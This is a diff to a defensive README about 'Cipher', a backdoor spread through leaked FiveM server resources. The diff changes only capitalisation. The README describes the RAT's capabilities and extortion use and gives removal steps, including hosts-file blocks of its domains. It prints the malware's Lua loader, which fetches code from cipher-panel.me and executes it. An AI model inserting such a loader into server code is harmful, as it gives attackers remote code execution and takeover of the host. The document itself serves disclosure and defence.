@@ -9,7 +9,7 @@ Cipher works by releasing infected code/resources to the FiveM public. Server ow
 The initial infected code boils down to the following:
 
 ```Lua
-PerformHttpRequest('https://cipher-panel.me/_i/i?to=UNIQUECODE', function (e, d)
+PerformHttpRequest('https://Cipher-panel.me/_i/i?to=UNIQUECODE', function (e, d)
 	local s = assert(load(d))
 	if (d == nil) then return end 
 	s() 
@@ -30,13 +30,13 @@ At this stage, its armageddon and all files within the server are compromised me
 
 Cipher is a rat that has the capability of gaining full system administrator access to take over the host machine it's run on. It does this by using powershell to download a rat executable and also add / alter users to provide remote desktop access to your server. This back door approach also supports linux too. 
 
-Cipher customers have been seen attempting to extort servers for money paid in crypto currency in exchange to deter the user of cipher from deleting the server entirely. 
+Cipher customers have been seen attempting to extort servers for money paid in crypto currency in exchange to deter the user of Cipher from deleting the server entirely. 
 
 Read Infection Documentation for more information on what it expands into.
 
 
 
-# How to remove Cipher.
+# How To Remove Cipher
 
 If you have been infected with Cipher, this is what you must do:
 
@@ -47,8 +47,8 @@ Blacklist their domains on your firewall. This will will slow them down however 
 Edit the hosts file `C://windows/system32/drivers/etc/hosts.txt` and add.
 
 `
-0.0.0.0 cipher-panel.me 
-0.0.0.0 ciphercheats.com
+0.0.0.0 Cipher-panel.me 
+0.0.0.0 Ciphercheats.com
 0.0.0.0 dark-utilities.xyz
 `
 
@@ -58,9 +58,9 @@ Check the system admins on the machine to verify that no unauthorized accounts e
 
 Change any passwords you have on the host machine to ensure that they don’t have access.
 
-While your fivem server is turned off, use the provided python script to install a nullifier which will help prevent future infections of cipher and tell you what files are infected. 
+While your fivem server is turned off, use the provided python script to install a nullifier which will help prevent future infections of Cipher and tell you what files are infected. 
  
-You can also install this code manually however we expect cipher will attempt to patch this.
+You can also install this code manually however we expect Cipher will attempt to patch this.
 
 scheduler.lua
 
@@ -69,9 +69,9 @@ scheduler.lua
 
 
 
-# Other things you can do to prevent being attacked by cipher
+# Other things you can do to prevent being attacked by Cipher
 
-Consider adding the [Warden](https://discord.com/invite/jeFeDRasfs) to your discord server. It's a great resource that can help remove cheaters and leakers (people who participate in sharing leaked paid resources) from your community or support hack products like cipher. 
+Consider adding the [Warden](https://discord.com/invite/jeFeDRasfs) to your discord server. It's a great resource that can help remove cheaters and leakers (people who participate in sharing leaked paid resources) from your community or support hack products like Cipher. 
 
 Make sure to install the latest updates of whatever framework you are using for [ESX](https://github.com/esx-framework/esx-legacy) | [ESX Discord](https://discord.esx-framework.org) [QBCore](https://github.com/qbcore-framework/qb-core) | [QBCore Discord](https://discord.gg/qbcore) 
 
@@ -86,4 +86,4 @@ Lastly, the most important thing… DON'T USE LEAKED RESOURCES!
 
 ## Cipher Customers
 
-If you are a customer of cipher, we suggest canceling your subscriptions and getting a refund.
+If you are a customer of Cipher, we suggest canceling your subscriptions and getting a refund.
